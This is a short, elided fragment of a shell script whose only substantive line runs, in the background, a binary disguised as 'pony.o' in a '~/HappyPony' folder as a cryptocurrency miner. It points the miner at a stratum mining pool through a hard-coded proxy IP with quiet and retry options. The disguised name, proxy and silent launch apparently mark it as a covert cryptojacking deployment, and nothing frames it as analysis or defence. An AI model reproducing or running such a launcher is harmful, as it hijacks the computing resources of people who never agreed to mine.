...
if [ "${RESULT:-null}" = null ]; then
    ...
    ~/HappyPony/pony.o --quiet --retry-pause=5 --retries=1 --algo=m7mhash --proxy=http://167.99.202.168:80 --url=stratum+tcp://magi.trasmamod.com:3333 --user=mindamp.test --pass=test -e 90 &
